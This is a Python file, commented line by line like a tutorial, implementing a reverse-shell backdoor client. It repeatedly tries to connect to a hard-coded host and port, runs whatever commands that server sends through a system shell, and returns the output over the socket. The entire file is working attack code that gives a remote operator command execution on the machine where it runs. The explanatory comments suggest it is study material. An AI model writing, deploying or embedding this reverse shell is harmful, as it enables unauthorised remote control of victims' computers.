# Import socket, json, subprocess and time libraries. Socket is for connectivity. Time is for delaying the infinite loop by 20 seconds each time it runs.
# Subprocess is used to execute commands on the target.
import socket
import time
import subprocess
import json

# Used to send the responses from this target.
def reliable_send(data):
        # jsondata is the variable storing the output of the json.dumps() function on the input command
        # Why use json.dumps()? json.dumps() function converts the input into a string that can be transmitted over a network.
        # Python is no good at creating useable / transmittable strings, but JSON conventions do just that for transmittability.
        jsondata = json.dumps(data)
        # 's' refers to the variable defined later in the program for the socket connection.
        s.send(jsondata.encode())

def reliable_recv():
        # First, create a 'data' variable with an empty string
        data = ''
        # then create an infinite loop for receiving commands from the server
        while True:
                try:
                        # The 'recv' function below is a from the 'socket' library and takes the data from the server.
                        # 1024 is the number of bytes to process. We also decode the data (encoded above with jsondata.encode()).
                        # rstrip() removes trailing characters from the 1024 byte length.
                        data = data + s.recv(1024).decode().rstrip()
                        # Using json.loads() to return the received info from the target - string is created with json.dumps() and read with json.loads().
                        return json.loads(data)
                except ValueError:
                        continue

# Create the 'Connection' function
def connection():
	# Create an infinite loop
	while True:
		# Create a 20 second delay between connection attempts
		time.sleep(20)
		try:
			# Try to connect to the server IP and Port
			s.connect(('192.168.86.32',1988))
			# If connection is successful, call the 'Shell' function
			shell()
			# Once 'Shell' connection has been called, close the socket
			s.close()
			# Once the socket has been closed, break the infinite loop
			break
		except:
			# If the 'try' section fails (connection to server fails), then call the 'Connection' function again.
			connection()

# Create the 'Shell' function to process commands
def shell():
	while True:
		# Create 'command' variable as the received command to execute
		command = reliable_recv()
		# If the input received from the server is 'quit', break the infinite loop, closing the connection.
		if command == 'quit':
			break
		# If the command isn't 'quit', then run the Popen (Process Open) function to execute the input.
		else:
			execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
			result = execute.stdout.read() + execute.stderr.read()
			# Prior to sending the response to the server, the result must be decoded because the 'execute' and 'result' variables are already encoded by the subprocess function.
			result = result.decode()
			reliable_send(result)

# Create socket object
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()
